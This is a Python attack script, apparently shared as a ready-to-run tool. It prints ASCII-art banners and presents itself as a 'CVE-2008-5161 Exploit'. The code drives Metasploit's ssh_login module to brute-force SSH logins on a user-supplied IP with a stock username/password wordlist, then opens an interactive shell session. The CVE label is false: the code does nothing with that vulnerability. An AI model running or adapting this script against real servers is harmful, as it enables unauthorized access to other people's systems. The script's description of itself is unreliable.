#!/usr/bin/python3

from pwn import *
import signal
import sys
print(""" 
██╗░░░██╗███╗░░██╗██╗░░██╗███╗░░██╗░█████╗░███╗░░██╗███████╗  
██║░░░██║████╗░██║██║░██╔╝████╗░██║██╔══██╗████╗░██║██╔════╝  
██║░░░██║██╔██╗██║█████═╝░██╔██╗██║██║░░██║██╔██╗██║█████╗░░  
██║░░░██║██║╚████║██╔═██╗░██║╚████║██║░░██║██║╚████║██╔══╝░░  
╚██████╔╝██║░╚███║██║░╚██╗██║░╚███║╚█████╔╝██║░╚███║███████╗  
░╚═════╝░╚═╝░░╚══╝╚═╝░░╚═╝╚═╝░░╚══╝░╚════╝░╚═╝░░╚══╝╚══════╝  

██╗░░░░░░█████╗░██╗░░██╗██╗░░██╗░█████╗░  
██║░░░░░██╔══██╗██║░██╔╝██║░░██║██╔══██╗  
██║░░░░░███████║█████═╝░███████║███████║  
██║░░░░░██╔══██║██╔═██╗░██╔══██║██╔══██║   
███████╗██║░░██║██║░╚██╗██║░░██║██║░░██║  
╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝  
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&*,,,,,,,,,*&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&*,,,,,,,,,,,,,,,,,,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&/**%&&&&&,,,,,,,,,,,,,,,,,,,,,,,#&&&&&**,&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&/*,*#&&&%,,,,,,,,,,,,,,,,,,,,,,,,,,&&&&****&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&**,**&&&,,,,,,,,,,,,,,,,,,,,,,,,,,,*&&**,**&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&#*,,**%*,,,,,,,,,,***,****,,,,,,,,,,&**,,**&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&**,,****,,****%&*&&&&&&&,&*****,,,**,,,*,&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&**,,,,*****&&#&&&&&*@&&&&,&&#****,,,,,*&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&**,,,,,,,*/&&&&%&&&&&/&&&&,*,,,,,,***&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&***,*****(&&&&/&&&&&&&&******,***%&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&**%*********&&&&&&&&&&&&&((*****&*#/*&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&*(,,&*&(&&,&(&/&&&&&&&&&&&@&&&&,&(#**(&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&*,&&&@&&&&,,%/&&&&&&&@&*,@&&&/&&&&*/&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&%*@*@&*&@@&.&&&&#&*&&&&*&&&&%@&*&*/&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&&*,*&&#****&,*/*(*&**&****&&&*#*&&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&,**#&#*#*****%,,&/#@*****/**&****&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&*/&&*#&&&&&/@&&&%&&&&*&&&&&&*&&%*&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&&&&*&***//&#@&&/&/&&&*@*#***&*/&&&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&&&***,**/*/&&&@&&&%&&&***,*,***&&&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&**,,,,,,,*&&&#*,&@&&&#&***&&&,*,,,,,,/*&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&**&&*/&&*******&@@*&&**&&&&&&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&&&&******%/***&&@&&*/*@***,***&&&&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&*&&(&/&&&,&(&#*(&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%*&&&&,&/&&&&*(&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&**/&&&%**&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
██╗░░██╗░█████╗░██████╗░████████╗
██║░░██║██╔══██╗██╔══██╗╚══██╔══╝
███████║███████║██████╔╝░░░██║░░░
██╔══██║██╔══██║██╔══██╗░░░██║░░░
██║░░██║██║░░██║██║░░██║░░░██║░░░
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░ """)
author = "unknone hart"

print(f"Author: {author}")
print("~ CVE-2008-5161 Exploit ~\n\n")

class ExploitSSH:
    def __init__(self, ip, wordlist="/usr/share/wordlists/metasploit/piata_ssh_userpass.txt", threads=12):
        self.ip = ip
        self.wordlist = wordlist
        self.threads = threads
        self.p = log.progress("")

    def exploit(self):
        try:
            self.p.status("Running MSFConsole...")
            msf = process(["msfconsole", "-q"], stdin=PTY)
            msf.recvuntil(b">")
            msf.sendline(b"use auxiliary/scanner/ssh/ssh_login")
            msf.sendline(f"set rhosts {self.ip}".encode())
            msf.sendline(f"set userpass_file {self.wordlist}".encode())
            msf.sendline(f"set stop_on_success true".encode())
            msf.sendline(f"set threads {self.threads}".encode())
            msf.sendline(b"set verbose true")
            msf.sendline(b"exploit")
            msf.recvuntil(b">")
            msf.sendline(b"show sessions")
            msf.sendline(b"sessions -i 1")
            msf.interactive()
            msf.close()
        except KeyboardInterrupt:
            print("\nExiting...")
            sys.exit(0)
        except Exception as e:
            self.p.failure(f"Error: {e}")
            exit()

def signal_handler(sig, frame):
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

try:
    target_ip = input("Enter Target IP: ").strip()
    custom_wordlist = input("Enter custom wordlist path (press Enter for default): ").strip()
    wordlist = custom_wordlist if custom_wordlist else "/usr/share/wordlists/metasploit/piata_ssh_userpass.txt"

    custom_threads = input("Enter number of threads (press Enter for default 12): ").strip()
    threads = int(custom_threads) if custom_threads else 12

    exploit = ExploitSSH(target_ip, wordlist, threads)
    exploit.exploit()
except KeyboardInterrupt:
    print("\nExiting...")
except Exception as e:
    print(f"Error: {e}")

